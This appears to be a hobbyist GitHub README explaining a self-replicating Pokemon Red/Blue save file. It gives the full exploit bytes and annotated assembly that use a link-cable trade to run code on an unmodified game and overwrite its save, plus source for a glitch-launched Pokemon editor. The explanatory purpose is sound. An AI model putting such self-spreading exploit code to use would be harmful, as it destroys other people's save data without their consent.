# pokered-self-replicator
A save file for Pokemon Red and Blue that can clone itself into other copies of the game that it communicates with via Game Link Cable.

For a demonstration and a simpler explanation of the exploit, see [this video.](https://www.youtube.com/watch?v=h5Igc18hc2Q)

----

### The "virus"

The goal here is, given that we allow ourselves the ability to modify one Pokemon Red or Blue save file arbitrarily, the save file should be capable of duplicating itself over the save file of a completely unmodified Red or Blue game. This duplication will be triggered by having both players attempt to trade Pokemon with each other. For simplicity, I will be referring to the save-edited game as Red, and the unmodified one as Blue, though either game can in fact be used in either role.

The exploit we use to remotely trigger arbitrary code is based on the method vaguilar discovered and documented [here.](http://vaguilar.js.org/posts/1/) The [Pokemon Red disassembly project](https://github.com/pret/pokered) was also instrumental here, particularly [wram.asm](https://github.com/pret/pokered/blob/master/wram.asm) (documentation of RAM contents) and [cable_club.asm](https://github.com/pret/pokered/blob/master/engine/cable_club.asm).

When two players try to trade with each other, they exchange (among other minor things) their player names and the data structure of their Pokemon parties. The party data structure consists of:

* 1 byte for the number of Pokemon
* 7 bytes for the species number of each of the 6 Pokemon in the party, followed by the terminator value $FF.
* $18C bytes containing more detailed info for each of the Pokemon.

Actually, the game just sends whatever is stored in RAM where the party data structure should be, and this RAM is copied directly from the save file. So already we see that we have full control over what party data structure Red sends Blue. We have it send the following:

    [00] [C3 22 D3 1F 1F 1F 1F 1F 1F 1F 1F 1F 1F 1F 1F
    1F 1F E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3 E3
    E3 *CE* E3 E3 E3 E3 E3 E3 E3 *F1*] [3E 08 E0 FF 21 16
    03 11 00 DC 01 10 01 CD 6F 21 21 00 DC 06 FD 2A
    B8 28 FC 2B E9] [00 00 00 00 00 00 00 00 00 00 00
    00 00 00 00]
    
After exchanging data, both games draw the species names of all the Pokemon in both parties to the screen. To do this, they don't use the party size value (which is in this case 00). They instead start from the first species value (C3 here) and will draw names forever, farther and farther down the screen until it encounters the terminator value of FF. Or more accurately, farther and farther down in RAM, overwriting data that has nothing to do with drawing to the screen. Eventually it will overwrite the stack, causing execution to jump somewhere else entirely, which we will have some control over.

The `C3 22 D3` at the beginning of the party list is there for a reason, but that won't be clear for a while. The repeated 1F's cause the Pokemon name "MISSINGNO." to be printed on screen a few times, just to make things look a bit glitchier. The many E3's are simply a glitch Pokemon whose name happens to be completely blank, so that we don't overwrite any RAM we want to leave intact by accident. Finally, we reach the species values of CE and F1. These are glitch Pokemon that are far enough down the list to cause Blue and Red (respectively) to overwrite their stack for a new return address. (Blue draws Red's party list lower down the screen than Red does, which is why we reach the stack earlier in Blue than in Red.) Now, it's necessary to consider both what Blue and Red will do from here. Let's follow Blue first.

Blue copies the name of glitch Pokemon CE over the stack, which happens to be `EE 21 96 D7 CB 86 21 A3 D7 CB`. It is the A3 D7 that gets read as a return address, so the game jumps to $D7A3 - an area of RAM. This area of RAM is mostly zeroes, which is the NOP instruction for the CPU used by the Game Boy, the Z80. So we proceed up until we reach $D887, which happens to be where Blue stores its copy of Red's player name. Red's name is `CD 6E 22 CD D7 3D C3 06 DA 50`, which is the following code (plus a string terminator):

    call $226E ; Serial_PrintWaitingTextAndSyncAndExchangeNybble
    call $3DD7 ; Delay3
    jp $DA06
    
Synchronizing the two Game Boys is necessary before exchanging serial (link cable) data. The jump leads back into the Pokemon data block that Blue received from Red, specifically the part starting 3E 08. While we eventually want to instruct Blue to request data from Red and copy that over its current save file, however we have very little room left in the block to write code. So instead what this code does is request another block of data from Red, which it will then execute.

    ld a,$08 ; interrupt from serial only
    ldh ($FF),a

    ; Serial_ExchangeBytes simultaneously sends and receives a block of data of size bc. The data sent is
    ; pointed to by hl, and must begin with the byte FD. The data received is stored to [de], and will start
    ; with an unknown number of FD bytes. To account for this, we need to set bc to be slightly larger
    ; than the size of the data we actually care about.
    
    ld hl,$0316 ; Some random garbage in ROM that happens to start with FD
    ld de,$dc00 ; An area of RAM not in use right now
    ld bc,$0110
    call $216F ; Serial_ExchangeBytes (216F)

    ld hl,$dc00
    ld b,$FD
    checkForFD: ; Increment hl until it points to a byte that isn't FD
    ld a,[hli]
    cp b
    jr z,checkForFD
    dec hl

    jp [hl]
    
The data that we have now received from Red is `26 0A 74 3E 01 EA 00 60 EA 00 40 3E A5 F5 3E 0D E0 FF CD 7F 22 CD D7 3D 3E 08 E0 FF 21 16 03 11 A0 C3 01 10 01 CD 6F 21 21 A0 C3 2A FE FD 28 FB 2B F1 F5 57 1E 00 01 00 01 CD B5 00 F1 3C FE B7 20 CB 26 00 74 3E 0D E0 FF CD D7 3D C3 00 01`, which is the code that finally requests the save data, and copies it over the existing data. It translates to the following:

    ; Enable the use of save RAM, and use save bank 01
    ld h,$0A
    ld [hl],h
    ld a,$01
    ld [$6000],a
    ld [$4000],a


    ; Work with $100 bytes at a type, eventually copying over everything from $A500-B700.
    ld a,$A5

    loop1:
    push af

    ; We synchronize again before each transmission of data.
    ld a,$0D ; enable interrupt from vsync
    ldh ($FF),a
    call $227F ; Serial_SyncAndExchangeNybble
    call $3DD7 ; Delay3
    ld a,$08 ; interrupt from serial only
    ldh ($FF),a

    ld hl,$0316
    ld de,$c3A0 ; copy received data to a graphics buffer so we can see progress as it happens
    ld bc,$0110
    call $216F ; Serial_ExchangeBytes (216F)


    ld hl,$c3A0
    checkForFD_2:
    ld a,[hli]
    cp $FD
    jr z,checkForFD_2
    dec hl

    ; CopyData copies bc bytes from hl to de. We copy the first $0100 received bytes (after the
    ; prelude of FD's) over one block of save data.
    pop af
    push af
    ld d,a
    ld e,$00
    ld bc,$0100
    call $00B5 ; CopyData
    
    ; loop until everything is copied from $A500-B700
    pop af
    inc a
    cp $B7
    jr nz,loop1

    ld h,$00 ; disable use of save ram
    ld [hl],h
    ld a,$0D ; enable interrupts from vsync
    ldh ($FF),a
    call $3DD7 ; Delay3

    jp $0100 ; reset

Once this runs, the save file will be copied and the virus has spread.

Now, we follow what Red has been doing at the same time. Things are similar, except instead of having to run code that gets sent by Blue, we run code from whatever free space we were able to find in the save file. For starters, the name of glitch Pokemon F1 gets printed onto the stack. This Pokemon has a name of `40 40 40 FF FA 30 D7 CB 47 C0`, and the 30 D7 gets read as the return address and we jump to $D730. This area is mostly zeros (NOPs), and contains various miscellaneous variables that are saved to and from the save file. Starting from $D743, we paste in some code of our own, although we need to be careful as the addresses that determine whether we are allowed to use the trade center and whether we get teleported to the Safari Zone entrance are both in this area. The code we place is: `CD 6E 22 CD D7 3D 3E 08 E0 FF 21 00 D6 11 20 C2 01 10 01 CD 6F 21 26 0A 74 3E 01 EA 00 60 EA 00 40 3E A5 F5 67 2E 00 11 01 C8 01 10 01 CD B5 00 3E 0D E0 FF CD 7F 22 CD D7 3D 3E 08 E0 FF 21 00 C8 36 FD 11 00 C1 01 10 01 CD 6F 21 F1 3C FE B7 20 D1 26 00 74 3E 0D E0 FF CD D7 3D C3 00 01`, which is the following:

    call $226E ; Serial_PrintWaitingTextAndSyncAndExchangeNybble (226E)
    call $3DD7 ; Delay3

    ld a,$08 ; interrupt from serial only
    ldh ($FF),a

    ld hl,$d600 ; send Blue the code mentioned above that starts with "26 0A 74", preceded by an FD (preamble) byte
    ld de,$c220 ; discard the useless data received from Blue into a graphics buffer
    ld bc,$0110
    call $216F ; Serial_ExchangeBytes (216F)

    ld h,$0A ; enable reading/writing from save file
    ld [hl],h
    ld a,$01
    ld [$6000],a
    ld [$4000],a

    ; loop through save from $A500-B700
    ld a,$A5

    loop2:
    push af
    ld h,a
    ld l,$00
    ld de,$c801 ; copy data from save into a currently-unused buffer
    ld bc,$0110
    call $00B5 ; CopyData

    ld a,$0D ; enable interrupts from vsync
    ldh ($FF),a
    call $227F ; Serial_SyncAndExchangeNybble
    call $3DD7 ; Delay3
    ld a,$08 ; interrupts from serial only
    ldh ($FF),a

    ld hl,$c800
    ld [hl],$FD ; precede the data from save with FD so we can exchange it
    ld de,$c100 ; dump the useless data received from Blue into a graphics buffer
    ld bc,$0110
    call $216F ; Serial_ExchangeBytes (216F)
    pop af
    inc a
    cp $B7 ; loop until $B700
    jr nz,loop2

    ld h,$00 ; disable reading/writing from save
    ld [hl],h
    ld a,$0D ; enable vsync interrupts
    ldh ($FF),a
    call $3DD7 ; Delay3

    jp $0100 ; reset

----

### The 8F arbitrary code

This is not related to the self-replication, but to demonstrate the implications of being able to spread a save file, the file
also includes a small program I wrote that allows the player to freely modify the Pokemon in their PC. This is done using 8F,
a glitch item that by coincidence happens to make the game jump execution to the beginning of party data. As shown way up there, we've set this data to start with `C3 22 D3`, which is `jp $D322`. This takes us to the middle of the player's item list, or rather the part of the item list that's going unused because there's only one item in the inventory.

There's not nearly enough free space in the item list - or indeed any other part of RAM that gets loaded from the save file - to fit the few hundred bytes we need for our program. So instead we have a short piece of code that loads the program from an entirely unused part of the save file:

    ld h,$0A ; enable reading/writing save file
    ld [hl],h
    ld a,$01 ; make sure save bank is 01
    ld [$6000],a
    ld [$4000],a

    ld hl,$B540 ; copy from unused part of save...
    ld de,$C800 ; into buffer that's not currently in use
    ld bc,$01C0 ; with length of $01C0
    call $00B5 ; CopyData

    ld h,$00 ; disable reading/writing save file
    ld [hl],h

    jp $C800

The Pokemon-editing program is in bank $01 address $B540 of the save, which is at $3540 if you look at the file in a hex editor. The details of how it works aren't important, but its source is below:

    xor a
    ld [$cf92],a ; menu selection = 0
    ld hl,$da80
    ld [hl],20
    main:
    xor a
    ld [$cca2],a ; submenu selection = 0
    call $190F ; ClearScreen

    mainloop:
    call $20AF ; DelayFrame
    call $019A ; Joypad

    ld a,$F6
    ld bc,50
    ld de,-45
    ld hl,$c3a0 + 22
    loop1:

    ld [hl],$F6
    inc hl
    ld [hl],a
    add hl,bc

    ld [hl],a
    dec hl
    ld [hl],$F7
    add hl,de

    inc a
    jr nz,loop1

    ld a,[$cf92]
    ld c,a
    ld hl,$c3a0 + 21
    add hl,bc
    add hl,bc
    add hl,bc
    add hl,bc
    add hl,bc
    ld [hl],$ED
    ldh a,($B3) ;joypad
    ld d,a

    cp $10
    jr nz,notRight
    inc b
    notRight:

    cp $20
    jr nz,notLeft
    dec b
    notLeft:

    cp $40
    jr nz,notUp
    ld b,-4
    notUp:

    cp $80
    jr nz,notDown
    ld b,4
    notDown:

    ld a,b
    cp $00
    jr z,noDirectionPressed
    ld [hl],$7F
    noDirectionPressed:
    add a,c
    cp 20
    jr nc,notInRange
    ld [$cf92],a
    notInRange:
    ld a,d
    cp $01
    jr z,goToSubmenu
    cp $02
    jr nz,mainloop
    ret

    goBack:
    jr main

    showStatus:
    ld a,2
    ld [$cc49],a
    ld a,$36 ; StatusScreen
    call $3E6D ; predef
    ld a,$37 ; StatusScreen2
    call $3E6D ; predef2
    ;call $3725 ;LoadScreenTilesFromBuffer1
    call $3090 ;ReloadTilesetTilePatterns
    ;call $3DED ;RunDefaultPaletteCommand
    call $20BA ;LoadGBPal

    goToSubmenu:
    jr submenu

    submenuloop:

    call $3DD7 ; Delay3
    call $019A ; Joypad

    ld a,[$cca2]
    ld b,0
    ld c,a
    ld hl,$c3a0 + 61
    add hl,bc
    add hl,bc
    add hl,bc
    add hl,bc
    add hl,bc
    ld [hl],$ED
    ldh a,($B3) ;joypad

    cp $02
    jr z,goBack
    cp $01
    jr z,showStatus

    cp $10
    jr nz,notRight2
    inc b
    notRight2:

    cp $20
    jr nz,notLeft2
    dec b
    notLeft2:

    ldh a,($B4) ;joypad (held)

    push hl
    ld hl,$cca3
    ld e,[hl]
    inc hl
    ld d,[hl]
    ld h,d
    ld l,e
    add hl,bc ; b will always be 0 if hl is used

    ld c,$1

    cp $40
    jr nz,notUp2
    inc [hl]
    dec c
    notUp2:

    cp $80
    jr nz,notDown2
    dec [hl]
    dec c
    notDown2:

    pop hl
    ld a,b
    cp $00
    jr z,noDirectionPressed2
    ld [hl],$7F
    noDirectionPressed2:
    ld hl, $cca2
    ld a,[hl]
    push af
    add b
    cp $21
    jr nc,notInRange2
    ld [hl],a
    notInRange2:

    ld hl, $c3a0 + 62
    ld a,$21

    numberLoop:
    ld b,a
    ld a,[de]
    swap a
    and $0F
    add $F6
    or $80
    ld [hli],a
    ld a,[de]
    and $0F
    add $F6
    or $80
    ld [hli],a
    inc hl
    inc hl
    inc hl
    ld a,b
    inc de
    dec a
    jr nz,numberLoop

    pop af
    or c
    jr z,submenu2

    goToSubmenuLoop:
    jr submenuloop


    submenu:
    call $190F ; ClearScreen
    submenu2:

    ld hl,$da96
    ld bc,$0021
    ld a,[$cf92]
    loop2:
    cp $00
    jr z,doneLoop2
    add hl,bc
    dec a
    jr loop2
    doneLoop2:

    ld a,[hl] ;species
    ld [$d11e],a
    ld d,h
    ld e,l
    push hl
    ld hl,$cf92
    ld c,[hl]
    ld hl,$da81
    add hl,bc
    ld [hl],a
    ld hl,$cca3
    ld [hl],e
    inc hl
    ld [hl],d
    pop hl
    call $2F9E ; GetMonName
    ld hl, $cd6d
    ld de, $c3a0 + 22
    ld bc,11
    push hl
    push de
    call $00B5 ; CopyData
    pop hl ; copy old de to hl
    ld a,11
    loop3:
    push af
    ld a,[hl]
    cp $50
    jr nz,not50
    ld a,$7F
    not50:
    ld [hli],a
    pop af
    dec a
    jr nz,loop3

    ld bc,11
    ld hl,$dd2a + 2
    ld a,[$cf92]
    loop4:
    cp $00
    jr z,doneLoop4
    add hl,bc
    dec a
    jr loop4
    doneLoop4:
    ld [hl],$50
    dec hl
    ld [hl],$85
    dec hl
    ld [hl],$86
    ld c,$DC
    add hl,bc

    ld d,h
    ld e,l
    pop hl ; copy old hl to hl
    ld c,11
    call $00B5 ; CopyData

    jr goToSubmenuLoop

----

### FAQ

**Why doesn't it work?**

You must be using the english version of red or blue. Use svdt or jksm to replace the save.

**Can this be done solely via gameplay rather than editing the save directly?**

Yes, there are various glitches to run arbitrary code in these games. However writing something of this size byte by byte via glitches would be extremely tedious.

**I want to do that, can you give me instructions?**

Trust me, it's not a good idea. It's much more practical to directly modify your Pokemon via ACE glitches, and forget the whole virus thing.

**Can you do this on Yellow/Gold/Silver/Crystal/other languages?**

It's possible, but you can't use the.same file used here.

**Why is the Poke Center glitched?**

This is a side effect of making the single save file compatible with both Red and Blue. A Poke Center that looks normal in Red will be unusable in Blue, and vice versa. The best I can do is a Poke Center that looks glitched in both, but is just functional enough that you can talk to the cable club lay.

**Can you make a version that allows you to still play the game normally?**

Yes, but because of the unterminated party list the game will crash when you open the party menu, so no point.

**Where's the music?**

[Here.](https://pigu-a.bandcamp.com/track/251-short-version) The full album includes a longer version of the song as a bonus track.

**How do I learn wizardry?**

Find something that really interests you and look into it with as much depth as you possibly can.
